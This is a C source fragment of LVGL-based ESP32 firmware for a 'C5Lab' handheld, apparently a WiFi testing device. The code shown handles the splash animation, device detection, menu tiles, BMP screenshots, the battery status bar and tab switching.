// Hide Evil Twin loading overlay
static void hide_evil_twin_loading_overlay(void) {
    if (evil_twin_loading_overlay) {
        lv_obj_del(evil_twin_loading_overlay);
        evil_twin_loading_overlay = NULL;
    }
}

//==================================================================================
// Startup Splash Screen with Glitch Animation
//==================================================================================

// Glitch colors for cyberpunk effect
static const lv_color_t glitch_colors[] = {
    {.red = 0x00, .green = 0xFF, .blue = 0xFF},  // Cyan
    {.red = 0xFF, .green = 0x00, .blue = 0xFF},  // Magenta
    {.red = 0xFF, .green = 0xFF, .blue = 0xFF},  // White
    {.red = 0x00, .green = 0xFF, .blue = 0x00},  // Green (matrix style)
    {.red = 0xFF, .green = 0xFF, .blue = 0x00},  // Yellow
};
#define GLITCH_COLOR_COUNT (sizeof(glitch_colors) / sizeof(glitch_colors[0]))

// Splash timer callback - creates glitch effect
static void splash_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    
    glitch_frame++;
    
    if (glitch_frame < 15) {
        // Glitch phase: rapid color and position changes
        if (splash_label) {
            // Random color from glitch palette
            int color_idx = glitch_frame % GLITCH_COLOR_COUNT;
            lv_obj_set_style_text_color(splash_label, glitch_colors[color_idx], 0);
            
            // Horizontal jitter effect
            int jitter_x = (glitch_frame % 3 == 0) ? ((glitch_frame % 2) ? 8 : -8) : 0;
            lv_obj_align(splash_label, LV_ALIGN_CENTER, jitter_x, 0);
        }
    } else if (glitch_frame < 25) {
        // Stabilize phase: settle on cyan color
        if (splash_label) {
            lv_obj_set_style_text_color(splash_label, lv_color_hex(0x00FFFF), 0);
            lv_obj_align(splash_label, LV_ALIGN_CENTER, 0, 0);
        }
    } else {
        // End splash and show detection popup
        ESP_LOGI(TAG, "Splash complete, showing detection popup");
        
        if (splash_timer) {
            lv_timer_del(splash_timer);
            splash_timer = NULL;
        }
        
        if (splash_screen) {
            lv_obj_del(splash_screen);
            splash_screen = NULL;
            splash_label = NULL;
        }
        
        // Show detection popup - it will wait for devices and then build UI
        show_detection_popup();
    }
}

// Detection complete callback - called after waiting for devices to stabilize
static void detection_complete_cb(lv_timer_t *timer)
{
    (void)timer;
    detection_timer = NULL;
    
    ESP_LOGI(TAG, "Detection timer complete, running board detection");
    
    // Run board detection
    detect_boards();
    
    // Check SD card presence on all detected devices
    check_all_sd_cards();
    
    ESP_LOGI(TAG, "Detection complete: uart1=%d, mbus=%d, grove=%d, usb=%d",
             uart1_detected, mbus_detected, grove_detected, usb_detected);
    
    // Remove detection popup
    if (detection_popup_overlay) {
        lv_obj_del(detection_popup_overlay);
        detection_popup_overlay = NULL;
    }
    
    // Show appropriate UI based on detection results
    if (!uart1_detected && !mbus_detected) {
        ESP_LOGI(TAG, "No boards detected - showing popup");
        show_no_board_popup();
    } else {
        ESP_LOGI(TAG, "Board(s) detected - showing main tiles");
        show_main_tiles();
    }
}

// Show detection popup while waiting for devices to stabilize
static void show_detection_popup(void)
{
    ESP_LOGI(TAG, "Showing detection popup (waiting for devices)");
    
    lv_obj_t *scr = lv_scr_act();
    
    // Create full-screen overlay
    detection_popup_overlay = lv_obj_create(scr);
    lv_obj_remove_style_all(detection_popup_overlay);
    lv_obj_set_size(detection_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(detection_popup_overlay, lv_color_hex(0x121212), 0);
    lv_obj_set_style_bg_opa(detection_popup_overlay, LV_OPA_COVER, 0);
    lv_obj_clear_flag(detection_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(detection_popup_overlay, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(detection_popup_overlay, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Spinner animation (LVGL 9.x API)
    lv_obj_t *spinner = lv_spinner_create(detection_popup_overlay);
    lv_spinner_set_anim_params(spinner, 1000, 60);  // 1000ms rotation, 60 degree arc
    lv_obj_set_size(spinner, 80, 80);
    lv_obj_set_style_arc_color(spinner, lv_color_hex(0x00FFFF), LV_PART_INDICATOR);
    lv_obj_set_style_arc_color(spinner, lv_color_hex(0x333333), LV_PART_MAIN);
    
    // Label
    lv_obj_t *label = lv_label_create(detection_popup_overlay);
    lv_label_set_text(label, "Detecting devices...");
    lv_obj_set_style_text_color(label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_text_font(label, &lv_font_montserrat_24, 0);
    lv_obj_set_style_pad_top(label, 20, 0);
    
    // Start timer - wait 2.5 seconds for USB and other devices to stabilize
    detection_timer = lv_timer_create(detection_complete_cb, 2500, NULL);
    lv_timer_set_repeat_count(detection_timer, 1);
    
    ESP_LOGI(TAG, "Detection timer started (2.5s)");
}

// Play startup beep (audio disabled due to linker issues - just log)
static void play_startup_beep(void)
{
    ESP_LOGI(TAG, "Startup beep (audio disabled)");
    vTaskDelete(NULL);
}

// Show splash screen with C5Lab glitch animation
static void show_splash_screen(void)
{
    ESP_LOGI(TAG, "Showing splash screen...");
    
    glitch_frame = 0;
    
    // Create full-screen black background
    splash_screen = lv_obj_create(lv_scr_act());
    lv_obj_remove_style_all(splash_screen);
    lv_obj_set_size(splash_screen, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(splash_screen, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(splash_screen, LV_OPA_COVER, 0);
    lv_obj_clear_flag(splash_screen, LV_OBJ_FLAG_SCROLLABLE);
    
    // C5Lab text with extra-large font
    splash_label = lv_label_create(splash_screen);
    lv_label_set_text(splash_label, "C5Lab");
    lv_obj_set_style_text_font(splash_label, &lv_font_montserrat_44, 0);  // Largest currently available font (rebuild with fullclean for 48)
    lv_obj_set_style_text_color(splash_label, lv_color_hex(0x00FFFF), 0);  // Start cyan
    lv_obj_center(splash_label);
    
    // Add subtle scan line effect (optional decorative element)
    lv_obj_t *subtitle = lv_label_create(splash_screen);
    lv_label_set_text(subtitle, "[ INITIALIZING ]");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x00FF00), 0);
    lv_obj_align(subtitle, LV_ALIGN_CENTER, 0, 50);
    
    // Start glitch animation timer (50ms intervals = 20 FPS)
    splash_timer = lv_timer_create(splash_timer_cb, 50, NULL);
    
    // Play startup beep in background task to not block UI
    xTaskCreate(
        (TaskFunction_t)play_startup_beep,
        "beep",
        4096,
        NULL,
        3,
        NULL
    );
}

// Scan button click handler
static void scan_btn_click_cb(lv_event_t *e)
{
    if (scan_in_progress) {
        ESP_LOGW(TAG, "Scan already in progress");
        return;
    }
    
    scan_in_progress = true;
    
    // Clear previous selections
    selected_network_count = 0;
    memset(selected_network_indices, 0, sizeof(selected_network_indices));
    
    // Disable button during scan
    lv_obj_add_state(scan_btn, LV_STATE_DISABLED);
    
    // Show large centered overlay with spinner
    show_scan_overlay();
    
    // Show small spinner next to button (optional backup)
    if (spinner) {
        lv_obj_clear_flag(spinner, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Update status
    if (status_label) {
        lv_label_set_text(status_label, "Scanning...");
    }
    
    // Clear previous results
    if (network_list) {
        lv_obj_clean(network_list);
    }
    
    // Start scan task
    xTaskCreate(wifi_scan_task, "wifi_scan", 8192, NULL, 5, NULL);
}

// Create a single tile button with icon, text, color
static lv_obj_t *create_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 230, 140);  // Large tile size for 3 columns
    lv_obj_set_style_bg_color(tile, bg_color, LV_STATE_DEFAULT);
    // Pressed state: lighten the color
    lv_obj_set_style_bg_color(tile, lv_color_lighten(bg_color, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 0, 0);  // No border for Material look
    lv_obj_set_style_radius(tile, 16, 0);  // Rounded corners
    lv_obj_set_style_shadow_width(tile, 12, 0);  // Material shadow
    lv_obj_set_style_shadow_color(tile, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(tile, LV_OPA_30, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 12, 0);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);  // Large icon
        lv_obj_set_style_text_color(icon_label, lv_color_make(255, 255, 255), 0);  // White icon
    }
    
    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_18, 0);  // Larger text
        lv_obj_set_style_text_color(text_label, lv_color_make(255, 255, 255), 0);  // White text
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(text_label, 210);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return tile;
}

// Create a smaller tile button for compact layouts (e.g., attack selection row)
static lv_obj_t *create_small_tile(lv_obj_t *parent, const char *icon, const char *text, lv_color_t bg_color, lv_event_cb_t callback, const char *user_data)
{
    lv_obj_t *tile = lv_btn_create(parent);
    lv_obj_set_size(tile, 108, 55);  // Wider tile for 4-tile layout
    lv_obj_set_style_bg_color(tile, bg_color, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(tile, lv_color_lighten(bg_color, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(tile, 0, 0);
    lv_obj_set_style_radius(tile, 8, 0);  // Smaller radius
    lv_obj_set_style_shadow_width(tile, 4, 0);  // Smaller shadow
    lv_obj_set_style_shadow_color(tile, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(tile, LV_OPA_30, 0);
    lv_obj_set_flex_flow(tile, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(tile, 4, 0);
    
    if (icon) {
        lv_obj_t *icon_label = lv_label_create(tile);
        lv_label_set_text(icon_label, icon);
        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_14, 0);  // Smaller icon
        lv_obj_set_style_text_color(icon_label, lv_color_make(255, 255, 255), 0);
    }
    
    if (text) {
        lv_obj_t *text_label = lv_label_create(tile);
        lv_label_set_text(text_label, text);
        lv_obj_set_style_text_font(text_label, &lv_font_montserrat_12, 0);  // Smaller text
        lv_obj_set_style_text_color(text_label, lv_color_make(255, 255, 255), 0);
        lv_obj_set_style_text_align(text_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_label_set_long_mode(text_label, LV_LABEL_LONG_WRAP);
        lv_obj_set_width(text_label, 75);
    }
    
    if (callback && user_data) {
        lv_obj_add_event_cb(tile, callback, LV_EVENT_CLICKED, (void*)user_data);
    }
    
    return tile;
}

// ============================================================================
// SCREENSHOT FUNCTIONALITY
// ============================================================================
#if SCREENSHOT_ENABLED
// lv_snapshot.h is included via lvgl.h when LV_USE_SNAPSHOT is enabled

// Global pointer to title label for visual feedback
static lv_obj_t *screenshot_title_label = NULL;

// Save screenshot to SD card as BMP
static void save_screenshot_to_sd(void)
{
    ESP_LOGI(TAG, "Taking screenshot...");
    
    // Ensure screenshots directory exists
    struct stat st;
    if (stat(SCREENSHOT_DIR, &st) != 0) {
        ESP_LOGI(TAG, "Creating screenshots directory...");
        if (mkdir(SCREENSHOT_DIR, 0755) != 0) {
            ESP_LOGE(TAG, "Failed to create screenshots directory: %s", strerror(errno));
            return;
        }
    }
    
    // Get current screen
    lv_obj_t *scr = lv_scr_act();
    if (!scr) {
        ESP_LOGE(TAG, "No active screen!");
        return;
    }
    
    // Take snapshot - RGB565 format (matches display)
    lv_draw_buf_t *snapshot = lv_snapshot_take(scr, LV_COLOR_FORMAT_RGB565);
    if (!snapshot) {
        ESP_LOGE(TAG, "Failed to take snapshot!");
        // Visual feedback - flash red
        if (screenshot_title_label) {
            lv_obj_set_style_text_color(screenshot_title_label, COLOR_MATERIAL_RED, 0);
            lv_refr_now(NULL);
            vTaskDelay(pdMS_TO_TICKS(200));
            lv_obj_set_style_text_color(screenshot_title_label, lv_color_make(255, 255, 255), 0);
        }
        return;
    }
    
    // Generate filename with timestamp
    time_t now;
    struct tm timeinfo;
    char filename[64];
    time(&now);
    localtime_r(&now, &timeinfo);
    snprintf(filename, sizeof(filename), "%s/scr_%04d%02d%02d_%02d%02d%02d.bmp",
             SCREENSHOT_DIR,
             timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday,
             timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
    
    ESP_LOGI(TAG, "Saving screenshot to: %s", filename);
    
    // Get image dimensions
    uint32_t width = snapshot->header.w;
    uint32_t height = snapshot->header.h;
    uint32_t stride = snapshot->header.stride;
    uint8_t *data = snapshot->data;
    
    ESP_LOGI(TAG, "Snapshot: %lux%lu, stride=%lu", width, height, stride);
    
    // Open file for writing
    FILE *f = fopen(filename, "wb");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open file for writing: %s", strerror(errno));
        lv_draw_buf_destroy(snapshot);
        // Visual feedback - flash red
        if (screenshot_title_label) {
            lv_obj_set_style_text_color(screenshot_title_label, COLOR_MATERIAL_RED, 0);
            lv_refr_now(NULL);
            vTaskDelay(pdMS_TO_TICKS(200));
            lv_obj_set_style_text_color(screenshot_title_label, lv_color_make(255, 255, 255), 0);
        }
        return;
    }
    
    // BMP file header (14 bytes)
    uint32_t row_size = ((width * 2 + 3) / 4) * 4;  // RGB565 = 2 bytes per pixel, padded to 4 bytes
    uint32_t pixel_data_size = row_size * height;
    uint32_t file_size = 14 + 40 + 12 + pixel_data_size;  // Header + DIB header + RGB565 masks + data
    
    // BMP Header
    uint8_t bmp_header[14] = {
        'B', 'M',                                    // Signature
        (uint8_t)(file_size), (uint8_t)(file_size >> 8),  // File size (little-endian)
        (uint8_t)(file_size >> 16), (uint8_t)(file_size >> 24),
        0, 0, 0, 0,                                  // Reserved
        14 + 40 + 12, 0, 0, 0                        // Pixel data offset (header + DIB + masks)
    };
    fwrite(bmp_header, 1, 14, f);
    
    // DIB Header (BITMAPINFOHEADER - 40 bytes)
    uint8_t dib_header[40] = {0};
    dib_header[0] = 40;  // DIB header size
    // Width (little-endian)
    dib_header[4] = (uint8_t)(width);
    dib_header[5] = (uint8_t)(width >> 8);
    dib_header[6] = (uint8_t)(width >> 16);
    dib_header[7] = (uint8_t)(width >> 24);
    // Height (negative for top-down)
    int32_t neg_height = -(int32_t)height;
    dib_header[8] = (uint8_t)(neg_height);
    dib_header[9] = (uint8_t)(neg_height >> 8);
    dib_header[10] = (uint8_t)(neg_height >> 16);
    dib_header[11] = (uint8_t)(neg_height >> 24);
    // Planes
    dib_header[12] = 1;
    dib_header[13] = 0;
    // Bits per pixel (16 for RGB565)
    dib_header[14] = 16;
    dib_header[15] = 0;
    // Compression (3 = BI_BITFIELDS)
    dib_header[16] = 3;
    dib_header[17] = 0;
    dib_header[18] = 0;
    dib_header[19] = 0;
    // Image size
    dib_header[20] = (uint8_t)(pixel_data_size);
    dib_header[21] = (uint8_t)(pixel_data_size >> 8);
    dib_header[22] = (uint8_t)(pixel_data_size >> 16);
    dib_header[23] = (uint8_t)(pixel_data_size >> 24);
    // Resolution (2835 pixels/meter = 72 DPI)
    dib_header[24] = 0x13; dib_header[25] = 0x0B; dib_header[26] = 0; dib_header[27] = 0;
    dib_header[28] = 0x13; dib_header[29] = 0x0B; dib_header[30] = 0; dib_header[31] = 0;
    // Colors
    dib_header[32] = 0; dib_header[33] = 0; dib_header[34] = 0; dib_header[35] = 0;
    dib_header[36] = 0; dib_header[37] = 0; dib_header[38] = 0; dib_header[39] = 0;
    fwrite(dib_header, 1, 40, f);
    
    // RGB565 bit masks (12 bytes)
    uint32_t red_mask = 0xF800;     // 5 bits red
    uint32_t green_mask = 0x07E0;   // 6 bits green
    uint32_t blue_mask = 0x001F;    // 5 bits blue
    fwrite(&red_mask, 4, 1, f);
    fwrite(&green_mask, 4, 1, f);
    fwrite(&blue_mask, 4, 1, f);
    
    // Write pixel data (row by row with padding)
    uint8_t padding[4] = {0, 0, 0, 0};
    uint32_t pad_bytes = row_size - (width * 2);
    
    for (uint32_t y = 0; y < height; y++) {
        fwrite(data + (y * stride), 1, width * 2, f);
        if (pad_bytes > 0) {
            fwrite(padding, 1, pad_bytes, f);
        }
    }
    
    fclose(f);
    lv_draw_buf_destroy(snapshot);
    
    ESP_LOGI(TAG, "Screenshot saved successfully: %s", filename);
    
    // Visual feedback - flash green briefly
    if (screenshot_title_label) {
        lv_obj_set_style_text_color(screenshot_title_label, COLOR_MATERIAL_GREEN, 0);
        lv_refr_now(NULL);
        vTaskDelay(pdMS_TO_TICKS(200));
        lv_obj_set_style_text_color(screenshot_title_label, lv_color_make(255, 255, 255), 0);
    }
}

// Screenshot click callback
static void screenshot_click_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "LABORATORIUM clicked - taking screenshot");
    save_screenshot_to_sd();
}
#else
// Stubs when screenshot is disabled
static void save_screenshot_to_sd(void) {}
static void screenshot_click_cb(lv_event_t *e) { (void)e; }
#endif

// Create status bar at top of screen (reusable helper)
static void create_status_bar(void)
{
    ESP_LOGI(TAG, "Creating status bar...");
    lv_obj_t *scr = lv_scr_act();
    
    // Delete existing status bar if present
    if (status_bar) {
        lv_obj_del(status_bar);
        status_bar = NULL;
        battery_voltage_label = NULL;
        charging_status_label = NULL;
        portal_icon = NULL;
    }
    
    // Create status bar at top of screen
    status_bar = lv_obj_create(scr);
    lv_obj_set_size(status_bar, lv_pct(100), 40);
    lv_obj_align(status_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(status_bar, lv_color_make(30, 30, 30), 0);  // Slightly lighter than background
    lv_obj_set_style_border_width(status_bar, 0, 0);
    lv_obj_set_style_radius(status_bar, 0, 0);
    lv_obj_set_style_pad_hor(status_bar, 16, 0);
    lv_obj_clear_flag(status_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    // App title centered - clickable for screenshot
    lv_obj_t *app_title = lv_label_create(status_bar);
    lv_label_set_text(app_title, "LABORATORIUM");
    lv_obj_set_style_text_font(app_title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(app_title, lv_color_make(255, 255, 255), 0);
    lv_obj_align(app_title, LV_ALIGN_CENTER, 0, 0);
    
#if SCREENSHOT_ENABLED
    // Make title clickable for screenshot trigger
    lv_obj_add_flag(app_title, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(app_title, screenshot_click_cb, LV_EVENT_CLICKED, NULL);
    screenshot_title_label = app_title;  // Store for visual feedback
#endif
    
    // Portal icon (shown when portal is active) - left of battery, non-clickable
    portal_icon = lv_label_create(status_bar);
    lv_label_set_text(portal_icon, LV_SYMBOL_WIFI);
    lv_obj_set_style_text_font(portal_icon, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(portal_icon, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_align(portal_icon, LV_ALIGN_RIGHT_MID, -160, 0);  // Left of battery container
    lv_obj_add_flag(portal_icon, LV_OBJ_FLAG_HIDDEN);  // Hidden by default
    
    // Battery status container on the right - use fixed width to ensure visibility
    lv_obj_t *battery_cont = lv_obj_create(status_bar);
    lv_obj_set_size(battery_cont, 140, 36);  // Fixed width for voltage + icon
    lv_obj_set_style_bg_opa(battery_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(battery_cont, 0, 0);
    lv_obj_set_style_pad_all(battery_cont, 0, 0);
    lv_obj_align(battery_cont, LV_ALIGN_RIGHT_MID, -8, 0);  // Small margin from edge
    lv_obj_set_flex_flow(battery_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(battery_cont, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(battery_cont, 8, 0);
    lv_obj_clear_flag(battery_cont, LV_OBJ_FLAG_SCROLLABLE);
    
    // Battery voltage label (e.g., "8.13V")
    battery_voltage_label = lv_label_create(battery_cont);
    lv_label_set_text(battery_voltage_label, "-.--V");
    lv_obj_set_style_text_font(battery_voltage_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(battery_voltage_label, lv_color_make(255, 255, 255), 0);
    
    // Charging status label (just icon, no text to save space)
    charging_status_label = lv_label_create(battery_cont);
    lv_label_set_text(charging_status_label, LV_SYMBOL_BATTERY_FULL);
    lv_obj_set_style_text_font(charging_status_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(charging_status_label, lv_color_make(255, 255, 255), 0);
    
    // Initialize INA226 if not already done
    if (!ina226_initialized) {
        ina226_init();
    }
    
    // Create battery status update timer if not already running
    if (battery_update_timer == NULL) {
        battery_update_timer = lv_timer_create(battery_status_timer_cb, BATTERY_UPDATE_MS, NULL);
        ESP_LOGI(TAG, "Battery timer created");
    }
    
    // Update battery status immediately
    update_battery_status();
    battery_status_timer_cb(NULL);
    
    ESP_LOGI(TAG, "Status bar created: voltage_label=%p, charging_label=%p, timer=%p",
             (void*)battery_voltage_label, (void*)charging_status_label, (void*)battery_update_timer);
}

// Get current UART port based on active tab
static uart_port_t get_current_uart(void)
{
    if (tab_is_mbus(current_tab) && uart2_initialized) {
        return UART2_NUM;
    }
    return UART_NUM;
}

// Send command to the UART corresponding to current tab
static void uart_send_command_for_tab(const char *cmd)
{
    if (tab_is_internal(current_tab)) {
        ESP_LOGW(TAG, "[INTERNAL/Tab] Ignoring command: %s", cmd);
        return;
    }

    uart_port_t uart_port = uart_port_for_tab(current_tab);
    transport_write_bytes_tab(current_tab, uart_port, cmd, strlen(cmd));
    transport_write_bytes_tab(current_tab, uart_port, "\r\n", 2);
    ESP_LOGI(TAG, "[%s/Tab] Sent command: %s", tab_transport_name(current_tab), cmd);
}

// Update tab button styles to show active tab
static void update_tab_styles(void)
{
    if (!internal_tab_btn) return;  // Need at least INTERNAL tab
    
    // ========== Grove tab styling ==========
    if (grove_tab_btn) {
        if (current_tab == TAB_GROVE) {
            // Active state - bright color with glow + border
            lv_obj_set_style_bg_color(grove_tab_btn, lv_color_hex(TAB_COLOR_UART1_ACTIVE), 0);
            lv_obj_set_style_bg_grad_color(grove_tab_btn, lv_color_hex(0x0097A7), 0);
            lv_obj_set_style_bg_grad_dir(grove_tab_btn, LV_GRAD_DIR_VER, 0);
            lv_obj_set_style_shadow_opa(grove_tab_btn, LV_OPA_80, 0);
            lv_obj_set_style_shadow_spread(grove_tab_btn, 4, 0);
            // Active indicator - white top border
            lv_obj_set_style_border_width(grove_tab_btn, 3, 0);
            lv_obj_set_style_border_color(grove_tab_btn, lv_color_hex(0xFFFFFF), 0);
            lv_obj_set_style_border_side(grove_tab_btn, LV_BORDER_SIDE_TOP, 0);
        } else {
            // Inactive state - dark muted color, no border
            lv_obj_set_style_bg_color(grove_tab_btn, lv_color_hex(TAB_COLOR_UART1_INACTIVE), 0);
            lv_obj_set_style_bg_grad_dir(grove_tab_btn, LV_GRAD_DIR_NONE, 0);
            lv_obj_set_style_shadow_opa(grove_tab_btn, LV_OPA_20, 0);
            lv_obj_set_style_shadow_spread(grove_tab_btn, 0, 0);
            lv_obj_set_style_border_width(grove_tab_btn, 0, 0);
        }
    }

    // ========== USB tab styling ==========
    if (usb_tab_btn) {
        if (current_tab == TAB_USB) {
            // Active state - bright color with glow + border
            lv_obj_set_style_bg_color(usb_tab_btn, lv_color_hex(TAB_COLOR_UART1_ACTIVE), 0);
            lv_obj_set_style_bg_grad_color(usb_tab_btn, lv_color_hex(0x0097A7), 0);
            lv_obj_set_style_bg_grad_dir(usb_tab_btn, LV_GRAD_DIR_VER, 0);
            lv_obj_set_style_shadow_opa(usb_tab_btn, LV_OPA_80, 0);
            lv_obj_set_style_shadow_spread(usb_tab_btn, 4, 0);
            // Active indicator - white top border
            lv_obj_set_style_border_width(usb_tab_btn, 3, 0);
            lv_obj_set_style_border_color(usb_tab_btn, lv_color_hex(0xFFFFFF), 0);
            lv_obj_set_style_border_side(usb_tab_btn, LV_BORDER_SIDE_TOP, 0);
        } else {
            // Inactive state - dark muted color, no border
            lv_obj_set_style_bg_color(usb_tab_btn, lv_color_hex(TAB_COLOR_UART1_INACTIVE), 0);
            lv_obj_set_style_bg_grad_dir(usb_tab_btn, LV_GRAD_DIR_NONE, 0);
            lv_obj_set_style_shadow_opa(usb_tab_btn, LV_OPA_20, 0);
            lv_obj_set_style_shadow_spread(usb_tab_btn, 0, 0);
            lv_obj_set_style_border_width(usb_tab_btn, 0, 0);
        }
    }
    
    // ========== UART 2 tab styling ==========
    if (mbus_tab_btn) {
        if (current_tab == TAB_MBUS) {
            // Active state - bright color with glow + border
            lv_obj_set_style_bg_color(mbus_tab_btn, lv_color_hex(TAB_COLOR_MBUS_ACTIVE), 0);
            lv_obj_set_style_bg_grad_color(mbus_tab_btn, lv_color_hex(0xF57C00), 0);
            lv_obj_set_style_bg_grad_dir(mbus_tab_btn, LV_GRAD_DIR_VER, 0);
            lv_obj_set_style_shadow_opa(mbus_tab_btn, LV_OPA_80, 0);
            lv_obj_set_style_shadow_spread(mbus_tab_btn, 4, 0);
            // Active indicator - white top border
            lv_obj_set_style_border_width(mbus_tab_btn, 3, 0);
            lv_obj_set_style_border_color(mbus_tab_btn, lv_color_hex(0xFFFFFF), 0);
            lv_obj_set_style_border_side(mbus_tab_btn, LV_BORDER_SIDE_TOP, 0);
        } else {
            // Inactive state - dark muted color, no border
            lv_obj_set_style_bg_color(mbus_tab_btn, lv_color_hex(TAB_COLOR_MBUS_INACTIVE), 0);
            lv_obj_set_style_bg_grad_dir(mbus_tab_btn, LV_GRAD_DIR_NONE, 0);
            lv_obj_set_style_shadow_opa(mbus_tab_btn, LV_OPA_20, 0);
            lv_obj_set_style_shadow_spread(mbus_tab_btn, 0, 0);
            lv_obj_set_style_border_width(mbus_tab_btn, 0, 0);
        }
    }
    
    // ========== INTERNAL tab styling ==========
    if (current_tab == TAB_INTERNAL) {
        // Active state - bright color with glow + border
        lv_obj_set_style_bg_color(internal_tab_btn, lv_color_hex(TAB_COLOR_INTERNAL_ACTIVE), 0);
        lv_obj_set_style_bg_grad_color(internal_tab_btn, lv_color_hex(0x7B1FA2), 0);
        lv_obj_set_style_bg_grad_dir(internal_tab_btn, LV_GRAD_DIR_VER, 0);
        lv_obj_set_style_shadow_opa(internal_tab_btn, LV_OPA_80, 0);
        lv_obj_set_style_shadow_spread(internal_tab_btn, 4, 0);
        // Active indicator - white top border
        lv_obj_set_style_border_width(internal_tab_btn, 3, 0);
        lv_obj_set_style_border_color(internal_tab_btn, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_style_border_side(internal_tab_btn, LV_BORDER_SIDE_TOP, 0);
    } else {
        // Inactive state - dark muted color, no border
        lv_obj_set_style_bg_color(internal_tab_btn, lv_color_hex(TAB_COLOR_INTERNAL_INACTIVE), 0);
        lv_obj_set_style_bg_grad_dir(internal_tab_btn, LV_GRAD_DIR_NONE, 0);
        lv_obj_set_style_shadow_opa(internal_tab_btn, LV_OPA_20, 0);
        lv_obj_set_style_shadow_spread(internal_tab_btn, 0, 0);
        lv_obj_set_style_border_width(internal_tab_btn, 0, 0);
    }
}

// Tab click callback - hide/show containers instead of recreating
static void tab_click_cb(lv_event_t *e)
{
    tab_id_t tab_id = (tab_id_t)(uintptr_t)lv_event_get_user_data(e);
    
    if (tab_id == current_tab) return;  // Already on this tab
    
    ESP_LOGI(TAG, "Switching from tab %d to tab %lu", current_tab, (unsigned long)tab_id);
    
    // *** SAVE current context BEFORE switching ***
    tab_context_t *old_ctx = get_current_ctx();
    save_globals_to_tab_context(old_ctx);
    
    // Hide current container (don't delete - preserve state)
    lv_obj_t *old_container = get_current_tab_container();
    if (old_container) {
        lv_obj_add_flag(old_container, LV_OBJ_FLAG_HIDDEN);
    }
    
    current_tab = tab_id;
    update_tab_styles();
    
    // Restore tab's context data to globals (for legacy code compatibility)
    tab_context_t *new_ctx = get_current_ctx();
    restore_tab_context_to_globals(new_ctx);
    restore_ui_pointers_from_ctx(new_ctx);
    
    // Show new container and restore its visible content
    lv_obj_t *new_container = get_current_tab_container();
    if (new_container) {
        lv_obj_clear_flag(new_container, LV_OBJ_FLAG_HIDDEN);
    }

    if (tab_is_internal(current_tab)) {
        if (!internal_tiles) {
            show_internal_tiles();
        }
        return;
    }

    if (tab_is_mbus(current_tab)) {
        if (!mbus_ctx.tiles) {
            show_mbus_tiles();
        } else if (mbus_ctx.current_visible_page) {
            lv_obj_clear_flag(mbus_ctx.current_visible_page, LV_OBJ_FLAG_HIDDEN);
        } else {
            lv_obj_clear_flag(mbus_ctx.tiles, LV_OBJ_FLAG_HIDDEN);
            mbus_ctx.current_visible_page = mbus_ctx.tiles;
        }
        return;
    }

    // Grove/USB tabs share UART1 UI
    if (!new_ctx->tiles) {
        show_uart1_tiles();
    } else if (new_ctx->current_visible_page) {
        lv_obj_clear_flag(new_ctx->current_visible_page, LV_OBJ_FLAG_HIDDEN);
    } else {
        lv_obj_clear_flag(new_ctx->tiles, LV_OBJ_FLAG_HIDDEN);
        new_ctx->current_visible_page = new_ctx->tiles;
    }
}

// Create persistent tab containers (called once at startup)
